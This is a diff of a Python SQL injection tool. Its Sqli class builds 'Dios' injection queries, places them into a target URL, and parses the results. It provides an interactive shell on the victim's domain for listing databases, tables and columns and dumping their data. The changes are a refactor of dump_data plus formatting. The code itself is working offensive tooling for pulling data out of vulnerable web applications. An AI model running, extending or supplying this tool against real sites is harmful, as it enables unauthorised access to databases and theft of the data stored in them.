@@ -86,37 +86,41 @@ class Sqli:
                     "socket": socket 
         }
     
-    def dump_data(self, tables, columns, database):
-        query = Dios().dump_data(tables, columns, database)
-        query_builder = Dios().build(query)
-        response = requests.get(self.url.replace('*',query_builder))
-        result = self.get_result(response.text)
-        sqli_array = result.split('<end/>,')
+    def dump_data(self, tables, columns, database, level=1):
+        if level==1:
+            query           = Dios().dump_data(tables, columns, database)
+            query_builder   = Dios().build(query)
+            response        = requests.get(self.url.replace('*',query_builder))
+            result          = self.get_result(response.text)
+            sqli_array      = result.split('<end/>,')
 
-        realResult=dict()
-        realResult['columns'] = columns
-        realResult['data'] = list()
-        for sqli in sqli_array:
-            self.result = sqli
+            realResult              = dict()
+            realResult['columns']   = columns
+            realResult['data']      = list()
+            for sqli in sqli_array:
+                self.result = sqli
+                result      = dict()
 
-            result = dict()
-            for column in columns:
-                result[column] = self.getResultByTag(column)
-            realResult['data'].append(result)
-        return realResult
+                for column in columns:
+                    result[column] = self.getResultByTag(column)
+                realResult['data'].append(result)
+            return realResult
 
     def command_line(self):
         user   = Dios().build(Dios().user())
         domain = re.search(r'(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,6}', self.url)[0]
+
         try:
-            response = requests.get(self.url.replace('*',user))
+            response    = requests.get(self.url.replace('*',user))
             sqli_helper = re.search("<sqli-helper>(.*)</sqli-helper>",response.text).group(1)
             user        = re.search("<user\(\)>(.*)</user\(\)>", sqli_helper)
             user        = user.group(1)
             cmd         = input("\033[91m┌["+ user.replace('@', '\033[93m@\033[96m') +"\033[91m]~[\033[32m"+ domain +"\033[91m]\n\033[91m└\033[93m#\033[97m ")
+
             if cmd == "dump_data":
                 r           = requests.get(self.url.replace('*', Dios().build(self.dios)))
                 output      = re.search("<sqli-helper>(.*)</sqli-helper>",r.text).group(1)
+
                 if re.search("<br>", output):
                     br = output.split("<br>")
                     for result in br:
@@ -133,9 +137,10 @@ class Sqli:
                     print(f"└[\033[92m•\033[97m] {db}")
                 self.command_line()
             elif re.search("use (.*)", cmd):
-                dbname = re.search('use (.*)', cmd).group(1)
+                dbname  = re.search('use (.*)', cmd).group(1)
                 r       = requests.get(self.url.replace('*', Dios().build(self.show_tables + Dios().strTohex(dbname) + ")")))
                 output  = re.search("<sqli-helper>(.*)</sqli-helper>",r.text)
+
                 if output != None:
                     self.database_name = dbname
                     print(f"\n[\033[92m+\033[97m] Database changed to : {dbname}\n")
@@ -148,6 +153,7 @@ class Sqli:
                 else:
                     r       = requests.get(self.url.replace('*', Dios().build(self.show_tables + Dios().strTohex(self.database_name) + ")")))
                     output  = re.search("<sqli-helper>(.*)</sqli-helper>",r.text)
+
                     if output != None:
                         print(f"[\033[92m+\033[97m] Tables from database {self.database_name} : ")
                         output = output.group(1).split("<br>")
@@ -157,7 +163,7 @@ class Sqli:
                         print(f'\n[\033[91m-\033[97m] Cannot show table from database {self.database_name}\n')
                 self.command_line()
             elif re.search("show columns (.*)", cmd):
-                table = re.search('show columns (.*)', cmd).group(1)
+                table   = re.search('show columns (.*)', cmd).group(1)
                 r       = requests.get(self.url.replace('*', Dios().build(self.show_columns + Dios().strTohex(table) + ")")))
                 output  = re.search("<sqli-helper>(.*)</sqli-helper>",r.text)
                 if output != None:
